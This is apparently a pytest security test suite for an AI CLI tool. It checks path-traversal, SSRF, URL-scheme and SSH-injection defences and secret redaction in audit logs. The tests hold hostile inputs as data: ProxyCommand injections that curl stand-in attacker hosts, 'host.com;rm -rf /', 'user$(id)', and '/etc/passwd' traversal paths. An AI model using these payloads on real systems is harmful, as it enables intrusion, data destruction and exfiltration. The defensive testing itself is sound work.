"""Security regression tests for ILX AI CLI — test_18_security_audit.

Covers every item requested in the security audit:

  1. test_no_shell_true_in_subprocess
       — scan all .py source files; assert no shell=True in production subprocess calls

  2. test_path_traversal_blocked
       — safe_resolve() with "../../../etc/passwd" returns None

  3. test_ssrf_blocks_localhost
       — fetch_url("http://127.0.0.1/admin") returns error, not data

  4. test_ssrf_blocks_private_ip
       — fetch_url("http://192.168.1.1/") returns error

  5. test_ssrf_blocks_metadata_endpoint
       — fetch_url("http://169.254.169.254/") returns error

  6. test_secret_redaction_in_audit
       — log_llm_call with api_key in context doesn't log the raw key

  7. test_user_tool_runs_in_subprocess
       — ToolRunner.run_sync() uses subprocess, not importlib

  8. test_url_scheme_validation
       — fetch_url("ftp://example.com") returns scheme error

  9. test_ssh_host_validation
       — SSHClient with malicious host string doesn't exec shell commands
"""
from __future__ import annotations

import ast
import json
import os
import sys
from pathlib import Path
from unittest import mock
from unittest.mock import MagicMock, patch

import pytest

_ROOT = Path(__file__).resolve().parent.parent
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))


# ---------------------------------------------------------------------------
# 1. No shell=True in subprocess calls (AST scan of production code)
# ---------------------------------------------------------------------------

class _ShellTrueScanner(ast.NodeVisitor):
    """AST visitor that records any Call node where shell=True is a keyword arg."""

    _SUBPROCESS_FUNCS = {"run", "Popen", "call", "check_call", "check_output"}

    def __init__(self):
        self.hits: list[tuple[int, str]] = []

    def visit_Call(self, node: ast.Call) -> None:  # noqa: N802
        func = node.func
        if isinstance(func, ast.Attribute) and func.attr in self._SUBPROCESS_FUNCS:
            for kw in node.keywords:
                if (
                    kw.arg == "shell"
                    and isinstance(kw.value, ast.Constant)
                    and kw.value.value is True
                ):
                    self.hits.append((node.lineno, f"subprocess.{func.attr}(...shell=True)"))
        self.generic_visit(node)


def test_no_shell_true_in_subprocess():
    """No production source file (app/, cli/, codex/) may use shell=True in subprocess."""
    search_dirs = [_ROOT / "app", _ROOT / "cli", _ROOT / "codex"]
    violations: list[str] = []

    for d in search_dirs:
        if not d.exists():
            continue
        for py_file in d.rglob("*.py"):
            try:
                source = py_file.read_text(encoding="utf-8", errors="replace")
                tree = ast.parse(source, filename=str(py_file))
            except (SyntaxError, OSError):
                continue
            scanner = _ShellTrueScanner()
            scanner.visit(tree)
            for lineno, snippet in scanner.hits:
                rel = py_file.relative_to(_ROOT)
                violations.append(f"{rel}:{lineno}  {snippet}")

    assert not violations, (
        "shell=True detected in production subprocess calls — "
        "command injection risk when commands include user input:\n"
        + "\n".join(violations)
    )


# ---------------------------------------------------------------------------
# 2. Path traversal blocked by safe_resolve()
# ---------------------------------------------------------------------------

def test_path_traversal_blocked(tmp_path):
    """safe_resolve() with '../../../etc/passwd' must return None."""
    from app.utils.file_utils import safe_resolve

    result = safe_resolve("../../../etc/passwd", str(tmp_path))
    assert result is None, (
        f"safe_resolve() must return None for path-traversal input, got: {result!r}"
    )


def test_path_traversal_blocked_dotdot_only(tmp_path):
    """safe_resolve() with plain '..' must also be blocked."""
    from app.utils.file_utils import safe_resolve

    result = safe_resolve("..", str(tmp_path))
    assert result is None, (
        f"safe_resolve() must return None for '..', got: {result!r}"
    )


def test_safe_resolve_valid_path_passes(tmp_path):
    """safe_resolve() with a valid relative path inside the sandbox returns a string."""
    from app.utils.file_utils import safe_resolve

    result = safe_resolve("subdir/file.txt", str(tmp_path))
    assert result is not None, "Valid sandbox path should be allowed"
    assert result.startswith(str(tmp_path)), f"Resolved path escapes sandbox: {result!r}"


# ---------------------------------------------------------------------------
# 3. SSRF blocks localhost
# ---------------------------------------------------------------------------

def test_ssrf_blocks_localhost():
    """fetch_url('http://127.0.0.1/admin') must return an error, not content."""
    from app.core.web_fetch import fetch_url

    result = fetch_url("http://127.0.0.1/admin")

    assert not result["ok"], "fetch_url must block 127.0.0.1 (loopback)"
    assert result["error"], "Expected a non-empty error message"
    assert not result["text"], "Must not return page content for blocked addresses"


def test_ssrf_blocks_localhost_name():
    """fetch_url('http://localhost/') must return an error."""
    from app.core.web_fetch import fetch_url

    result = fetch_url("http://localhost/secret")
    assert not result["ok"], "fetch_url must block 'localhost'"


# ---------------------------------------------------------------------------
# 4. SSRF blocks private IP
# ---------------------------------------------------------------------------

def test_ssrf_blocks_private_ip():
    """fetch_url('http://192.168.1.1/') must return an error."""
    from app.core.web_fetch import fetch_url

    result = fetch_url("http://192.168.1.1/")
    assert not result["ok"], "fetch_url must block 192.168.x.x private range"
    assert result["error"]

def test_ssrf_blocks_private_10():
    """fetch_url('http://10.0.0.1/') must return an error."""
    from app.core.web_fetch import fetch_url

    result = fetch_url("http://10.0.0.1/")
    assert not result["ok"], "fetch_url must block 10.x.x.x private range"


# ---------------------------------------------------------------------------
# 5. SSRF blocks metadata endpoint
# ---------------------------------------------------------------------------

def test_ssrf_blocks_metadata_endpoint():
    """fetch_url('http://169.254.169.254/') must be blocked (cloud metadata service)."""
    from app.core.web_fetch import fetch_url

    result = fetch_url("http://169.254.169.254/latest/meta-data/")
    assert not result["ok"], (
        "fetch_url must block 169.254.x.x (AWS/GCP/Azure metadata endpoint)"
    )
    assert result["error"], "Expected an error message for metadata endpoint block"
    assert not result["text"], "Must return no page text for blocked address"


def test_ssrf_blocks_metadata_via_check_ssrf():
    """_check_ssrf() directly returns an error message for 169.254.x.x IPs."""
    from app.core.web_fetch import _check_ssrf

    with mock.patch("app.core.web_fetch.socket.getaddrinfo") as mock_gai:
        mock_gai.return_value = [(None, None, None, None, ("169.254.169.254", 0))]
        result = _check_ssrf("169.254.169.254")

    assert result is not None, (
        "_check_ssrf() must return an error string for 169.254.169.254, got None"
    )
    # The message should mention the IP or block reason
    assert "169.254" in result or "metadata" in result.lower() or "link-local" in result.lower(), (
        f"Error should mention 169.254 or metadata, got: {result!r}"
    )


# ---------------------------------------------------------------------------
# 6. Secret redaction in audit log
# ---------------------------------------------------------------------------

def test_secret_redaction_in_audit(tmp_path):
    """log_event() must never write a raw API key to the audit log file."""
    import app.core.audit as audit

    fake_log = tmp_path / "audit.log"
    with mock.patch.object(audit, "_LOG_PATH", fake_log):
        audit.log_event(
            "llm_call",
            api_key="sk-supersecretkey1234567890",
            model="gpt-4o",
            provider="openai",
            prompt_tokens=10,
        )

    assert fake_log.exists(), "Audit log was not created"
    line = fake_log.read_text(encoding="utf-8").strip()
    record = json.loads(line)

    # The raw key must NOT appear anywhere in the written JSON
    raw_key = "sk-supersecretkey1234567890"
    assert raw_key not in line, (
        f"Raw API key appeared in audit log line: {line!r}"
    )
    assert record.get("api_key") == "<redacted>", (
        f"api_key field should be '<redacted>', got: {record.get('api_key')!r}"
    )
    # Non-secret fields must pass through
    assert record.get("model") == "gpt-4o"
    assert record.get("provider") == "openai"
    assert record.get("prompt_tokens") == 10


def test_secret_redaction_password_field(tmp_path):
    """log_event() must redact 'password' fields."""
    import app.core.audit as audit

    fake_log = tmp_path / "audit.log"
    with mock.patch.object(audit, "_LOG_PATH", fake_log):
        audit.log_event("auth", password="hunter2", username="alice")

    record = json.loads(fake_log.read_text(encoding="utf-8").strip())
    assert record.get("password") == "<redacted>", (
        f"password should be '<redacted>', got: {record.get('password')!r}"
    )
    assert record.get("username") == "alice"  # non-secret should pass through


def test_secret_redaction_token_field(tmp_path):
    """log_event() must redact 'access_token' fields."""
    import app.core.audit as audit

    fake_log = tmp_path / "audit.log"
    with mock.patch.object(audit, "_LOG_PATH", fake_log):
        audit.log_event("event", access_token="tok_abc123xyz", user_id=99)

    record = json.loads(fake_log.read_text(encoding="utf-8").strip())
    assert record.get("access_token") == "<redacted>"
    assert record.get("user_id") == 99


# ---------------------------------------------------------------------------
# 7. User tool runs in subprocess, not imported in-process
# ---------------------------------------------------------------------------

def test_user_tool_runs_in_subprocess(tmp_path):
    """ToolRunner.run_sync() must invoke subprocess.run, never importlib."""
    from app.core.user_tools.runner import ToolRunner

    tool_file = tmp_path / "mytool.py"
    tool_file.write_text('print("hello from tool")\n', encoding="utf-8")

    runner = ToolRunner()

    with mock.patch("app.core.user_tools.runner.subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(returncode=0, stdout="hello from tool\n", stderr="")
        result = runner.run_sync(str(tool_file))

    # subprocess.run must have been called (not importlib)
    mock_run.assert_called_once()
    # The command list must include the tool file path
    cmd = mock_run.call_args[0][0]
    assert str(tool_file) in cmd, (
        f"Tool file path must appear in the subprocess command, got: {cmd}"
    )
    # The result must indicate success
    assert result["ok"] is True
    assert "exit_code" in result


def test_user_tool_subprocess_not_importlib(tmp_path):
    """ToolRunner must not call importlib.import_module to load user tools."""
    from app.core.user_tools.runner import ToolRunner

    tool_file = tmp_path / "badtool.py"
    tool_file.write_text('import os; os.system("id")\n', encoding="utf-8")

    runner = ToolRunner()

    # Track importlib usage
    import_calls: list[str] = []

    original_import = __builtins__.__import__ if isinstance(__builtins__, type(os)) else __import__

    with mock.patch("app.core.user_tools.runner.subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")
        with mock.patch("importlib.import_module") as mock_import:
            result = runner.run_sync(str(tool_file))

    # importlib.import_module must NOT have been called
    mock_import.assert_not_called()


# ---------------------------------------------------------------------------
# 8. URL scheme validation
# ---------------------------------------------------------------------------

def test_url_scheme_validation_ftp():
    """fetch_url('ftp://example.com') must return a scheme-rejection error."""
    from app.core.web_fetch import fetch_url

    result = fetch_url("ftp://example.com/file.txt")
    assert not result["ok"], "ftp:// must be rejected"
    assert "ftp" in result["error"].lower() or "scheme" in result["error"].lower(), (
        f"Expected scheme-rejection error mentioning 'ftp' or 'scheme', got: {result['error']!r}"
    )


def test_url_scheme_validation_file():
    """fetch_url('file:///etc/passwd') must be rejected."""
    from app.core.web_fetch import fetch_url

    result = fetch_url("file:///etc/passwd")
    assert not result["ok"], "file:// must be rejected"


def test_url_scheme_validation_javascript():
    """fetch_url('javascript:alert(1)') must be rejected."""
    from app.core.web_fetch import fetch_url

    result = fetch_url("javascript:alert(1)")
    assert not result["ok"], "javascript: scheme must be rejected"


def test_url_scheme_validation_data():
    """fetch_url('data:text/html,...') must be rejected."""
    from app.core.web_fetch import fetch_url

    result = fetch_url("data:text/html,<h1>XSS</h1>")
    assert not result["ok"], "data: scheme must be rejected"


def test_url_scheme_https_passes_scheme_check():
    """https:// passes scheme and SSRF validation for public hosts."""
    from app.core.web_fetch import _check_ssrf
    from urllib.parse import urlparse

    url = "https://example.com/page"
    parsed = urlparse(url)
    assert parsed.scheme in ("http", "https"), "https:// must pass scheme check"
    # For a real public IP this should return None (allowed)
    with mock.patch("app.core.web_fetch.socket.getaddrinfo") as mock_gai:
        mock_gai.return_value = [(None, None, None, None, ("93.184.216.34", 0))]  # example.com
        err = _check_ssrf(parsed.hostname)
    assert err is None, f"Public IP should not be blocked by SSRF guard, got: {err!r}"


# ---------------------------------------------------------------------------
# 9. SSH host validation
# ---------------------------------------------------------------------------

def test_ssh_host_validation_valid_host():
    """_validate_ssh_target returns (True, '') for a normal hostname."""
    from app.core.ssh_client import _validate_ssh_target

    ok, err = _validate_ssh_target("alice", "server.example.com")
    assert ok, f"Valid host should pass validation, error: {err!r}"
    assert err == ""


def test_ssh_host_validation_injection_blocked():
    """_validate_ssh_target rejects a host string that is an SSH option injection."""
    from app.core.ssh_client import _validate_ssh_target

    # A classic SSH option injection attempt: "-oProxyCommand=curl attacker.com"
    ok, err = _validate_ssh_target("user", "-oProxyCommand=curl attacker.com")
    assert not ok, "SSH option injection host must be rejected"
    assert err, "Should return a non-empty error message"


def test_ssh_host_validation_semicolon_blocked():
    """Shell metacharacter ';' in hostname must be rejected."""
    from app.core.ssh_client import _validate_ssh_target

    ok, err = _validate_ssh_target("user", "host.com;rm -rf /")
    assert not ok, "Hostname with semicolon must be rejected"


def test_ssh_user_validation_injection_blocked():
    """Shell metacharacter in username must be rejected."""
    from app.core.ssh_client import _validate_ssh_target

    ok, err = _validate_ssh_target("user$(id)", "host.com")
    assert not ok, "Username with shell metacharacter must be rejected"


def test_ssh_connect_does_not_exec_for_bad_host():
    """SSHClient.connect() with a malicious host must fail validation before
    making any subprocess or network call."""
    from app.core.ssh_client import SSHClient

    client = SSHClient(
        host="-oProxyCommand=curl http://evil.attacker.com",
        user="victim",
    )

    with mock.patch("app.core.ssh_client.subprocess.run") as mock_run, \
         mock.patch("app.core.ssh_client.subprocess.Popen") as mock_popen:
        result = client.connect()

    assert not result["ok"], "connect() must return ok=False for invalid host"
    # No subprocess calls must have been made
    mock_run.assert_not_called()
    mock_popen.assert_not_called()
